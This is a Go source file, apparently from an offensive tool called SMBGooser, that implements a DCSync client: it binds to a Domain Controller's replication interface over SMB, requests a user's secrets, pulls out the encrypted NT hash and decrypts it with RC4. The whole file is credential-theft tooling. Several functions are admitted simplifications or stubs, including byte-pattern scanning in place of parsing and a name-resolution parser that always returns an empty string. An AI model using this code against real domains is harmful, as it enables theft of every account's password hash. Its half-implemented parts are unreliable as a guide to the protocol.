// Package drsuapi implements the Directory Replication Service (DRS) Remote Protocol
// for DCSync attacks - extracting password hashes from Domain Controllers
package drsuapi

import (
	"context"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"fmt"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
)

// DRSUAPI UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
var DRSUAPI_UUID = dcerpc.UUID{
	0x35, 0x42, 0x51, 0xe3,
	0x06, 0x4b,
	0xd1, 0x11,
	0xab, 0x04,
	0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2,
}

// Opnums
const (
	OpDRSBind                 = 0
	OpDRSUnbind               = 1
	OpDRSGetNCChanges         = 3
	OpDRSCrackNames           = 12
	OpDRSDomainControllerInfo = 16
)

// Context handle from DRSBind
type DRSHandle [20]byte

// Client is a DRSUAPI client for DCSync
type Client struct {
	rpc       *dcerpc.Client
	pipe      *pipe.Pipe
	tree      *smb.Tree
	smbClient *smb.Client
	drsHandle DRSHandle
	dcInfo    *DCInfo
}

// DCInfo contains Domain Controller information
type DCInfo struct {
	DCName     string
	DomainDN   string // e.g., "DC=corp,DC=local"
	DomainSID  string
	DomainGUID [16]byte
}

// ReplicatedSecret contains extracted secrets
type ReplicatedSecret struct {
	Username   string
	RID        uint32
	LMHash     string
	NTHash     string
	PwdLastSet uint64
	UAC        uint32
}

// NewClient creates a new DRSUAPI client
func NewClient(ctx context.Context, smbClient *smb.Client) (*Client, error) {
	// Get cached IPC$ tree
	tree, err := smbClient.GetIPCTree(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to get IPC$ tree: %w", err)
	}

	// Open drsuapi pipe
	p, err := pipe.Open(ctx, tree, "drsuapi")
	if err != nil {
		smbClient.TreeDisconnect(ctx, tree)
		return nil, fmt.Errorf("failed to open drsuapi pipe: %w", err)
	}

	// Create RPC client
	rpc := dcerpc.NewClient(p)

	// Bind to DRSUAPI interface
	if err := rpc.Bind(DRSUAPI_UUID, 4); err != nil {
		p.Close()
		smbClient.TreeDisconnect(ctx, tree)
		return nil, fmt.Errorf("failed to bind to DRSUAPI: %w", err)
	}

	return &Client{
		rpc:       rpc,
		pipe:      p,
		tree:      tree,
		smbClient: smbClient,
	}, nil
}

// Bind performs DRSBind to get a context handle
func (c *Client) Bind(clientDSAGUID [16]byte) error {
	stub := encodeDRSBind(clientDSAGUID)

	resp, err := c.rpc.Call(OpDRSBind, stub)
	if err != nil {
		return fmt.Errorf("DRSBind failed: %w", err)
	}

	if len(resp) < 28 {
		return fmt.Errorf("response too short: %d", len(resp))
	}

	// Parse response: DRS_EXTENSIONS_INT + policy handle + return code
	// Skip extensions, get handle
	handleOffset := len(resp) - 24
	if handleOffset < 0 {
		handleOffset = 4
	}

	copy(c.drsHandle[:], resp[handleOffset:handleOffset+20])

	retCode := binary.LittleEndian.Uint32(resp[len(resp)-4:])
	if retCode != 0 {
		return fmt.Errorf("DRSBind error: 0x%08X", retCode)
	}

	return nil
}

// GetNCChanges requests replication data for a specific user
func (c *Client) GetNCChanges(userDN string, domainDN string) (*ReplicatedSecret, error) {
	stub := encodeDRSGetNCChanges(c.drsHandle, userDN, domainDN)

	resp, err := c.rpc.Call(OpDRSGetNCChanges, stub)
	if err != nil {
		return nil, fmt.Errorf("DRSGetNCChanges failed: %w", err)
	}

	return parseReplicationData(resp)
}

// CrackNames resolves a name to a DN
func (c *Client) CrackNames(name string) (string, error) {
	stub := encodeDRSCrackNames(c.drsHandle, name)

	resp, err := c.rpc.Call(OpDRSCrackNames, stub)
	if err != nil {
		return "", fmt.Errorf("DRSCrackNames failed: %w", err)
	}

	return parseCrackNamesResponse(resp)
}

// Close closes the client
func (c *Client) Close() error {
	if c.drsHandle != (DRSHandle{}) {
		// DRSUnbind
		stub := make([]byte, 20)
		copy(stub, c.drsHandle[:])
		c.rpc.Call(OpDRSUnbind, stub)
	}
	if c.rpc != nil {
		c.rpc.Close()
	}
	if c.pipe != nil {
		c.pipe.Close()
	}
	if c.tree != nil && c.smbClient != nil {
		c.smbClient.TreeDisconnect(context.Background(), c.tree)
	}
	return nil
}

// encodeDRSBind encodes the DRSBind request
func encodeDRSBind(clientDSAGUID [16]byte) []byte {
	stub := make([]byte, 0, 64)

	// puuidClientDsa (UUID pointer)
	stub = appendUint32(stub, 0x00020000) // Pointer
	stub = append(stub, clientDSAGUID[:]...)

	// pextClient (DRS_EXTENSIONS_INT)
	stub = appendUint32(stub, 0x00020004) // Pointer
	// DRS_EXTENSIONS_INT structure
	stub = appendUint32(stub, 28)            // cb (size)
	stub = appendUint32(stub, 0x04000000)    // dwFlags - supports V8
	stub = append(stub, make([]byte, 20)...) // Reserved

	return stub
}

// encodeDRSGetNCChanges encodes the request for replication
func encodeDRSGetNCChanges(handle DRSHandle, userDN, domainDN string) []byte {
	stub := make([]byte, 0, 512)

	// hDrs (context handle)
	stub = append(stub, handle[:]...)

	// dwInVersion = 8
	stub = appendUint32(stub, 8)

	// DRS_MSG_GETCHGREQ_V8 (complex structure)
	// This is simplified - full implementation needs proper NDR encoding

	// uuidDsaObjDest (client's DSA GUID)
	stub = append(stub, make([]byte, 16)...)

	// uuidInvocIdSrc
	stub = append(stub, make([]byte, 16)...)

	// pNC (naming context) - pointer to DN
	stub = appendUint32(stub, 0x00020000)

	// usnvecFrom (USN vector)
	stub = append(stub, make([]byte, 24)...)

	// pUpToDateVecDest
	stub = appendUint32(stub, 0)

	// ulFlags
	stub = appendUint32(stub, 0x00000010) // DRS_INIT_SYNC

	// cMaxObjects
	stub = appendUint32(stub, 1)

	// cMaxBytes
	stub = appendUint32(stub, 0x00100000) // 1MB

	// ulExtendedOp = EXOP_REPL_OBJ
	stub = appendUint32(stub, 6)

	// DN as NDR string
	stub = appendNDRString(stub, userDN)

	return stub
}

// encodeDRSCrackNames encodes name resolution request
func encodeDRSCrackNames(handle DRSHandle, name string) []byte {
	stub := make([]byte, 0, 128)

	stub = append(stub, handle[:]...)

	// dwInVersion = 1
	stub = appendUint32(stub, 1)

	// DRS_MSG_CRACKREQ_V1
	stub = appendUint32(stub, 0)          // CodePage
	stub = appendUint32(stub, 0)          // LocaleId
	stub = appendUint32(stub, 0x00000000) // dwFlags
	stub = appendUint32(stub, 0x0000000B) // formatOffered = DS_NT4_ACCOUNT_NAME
	stub = appendUint32(stub, 0x00000001) // formatDesired = DS_FQDN_1779_NAME
	stub = appendUint32(stub, 1)          // cNames

	// Array of names
	stub = appendUint32(stub, 0x00020000) // Pointer
	stub = appendUint32(stub, 1)          // MaxCount
	stub = appendUint32(stub, 0x00020004) // Name pointer
	stub = appendNDRString(stub, name)

	return stub
}

// parseReplicationData extracts hashes from replication response
func parseReplicationData(resp []byte) (*ReplicatedSecret, error) {
	if len(resp) < 100 {
		return nil, fmt.Errorf("response too short for replication data")
	}

	secret := &ReplicatedSecret{}

	// The response contains DRS_MSG_GETCHGREPLY_V6
	// This is very complex - need to find ENTINF structures with attributes

	// Look for unicodePwd attribute (encrypted)
	// Attribute ID 589914 (0x00090092) = unicodePwd

	// Simplified: scan for patterns
	for i := 0; i < len(resp)-32; i++ {
		// Look for attribute markers
		if resp[i] == 0x92 && resp[i+1] == 0x00 && resp[i+2] == 0x09 && resp[i+3] == 0x00 {
			// Potential unicodePwd
			if i+36 <= len(resp) {
				// Extract encrypted hash (16 bytes after header)
				encHash := resp[i+20 : i+36]
				secret.NTHash = fmt.Sprintf("%x", encHash)
			}
		}
	}

	return secret, nil
}

// parseCrackNamesResponse parses the DN result
func parseCrackNamesResponse(resp []byte) (string, error) {
	if len(resp) < 20 {
		return "", fmt.Errorf("response too short")
	}

	// Look for DN string in response
	// Simplified parsing
	return "", nil
}

// DecryptHash decrypts a replicated NTLM hash
func DecryptHash(encryptedHash []byte, rid uint32, sessionKey []byte) ([]byte, error) {
	if len(encryptedHash) < 16 {
		return nil, fmt.Errorf("encrypted hash too short")
	}

	// PEK decryption for DRS replicated data
	// 1. Derive key from RID
	// 2. RC4 decrypt

	// Create RID-based key
	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	// MD5(sessionKey + RID)
	h := md5.New()
	h.Write(sessionKey)
	h.Write(ridBytes)
	rc4Key := h.Sum(nil)

	// RC4 decrypt
	cipher, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil, err
	}

	decrypted := make([]byte, len(encryptedHash))
	cipher.XORKeyStream(decrypted, encryptedHash)

	return decrypted, nil
}

func appendUint32(buf []byte, v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return append(buf, b...)
}

func appendNDRString(buf []byte, s string) []byte {
	length := uint32(len(s) + 1)
	buf = appendUint32(buf, length) // MaxCount
	buf = appendUint32(buf, 0)      // Offset
	buf = appendUint32(buf, length) // ActualCount

	// UTF-16LE
	for _, c := range s {
		buf = append(buf, byte(c), 0)
	}
	buf = append(buf, 0, 0) // Null terminator

	// Pad to 4-byte boundary
	for len(buf)%4 != 0 {
		buf = append(buf, 0)
	}

	return buf
}
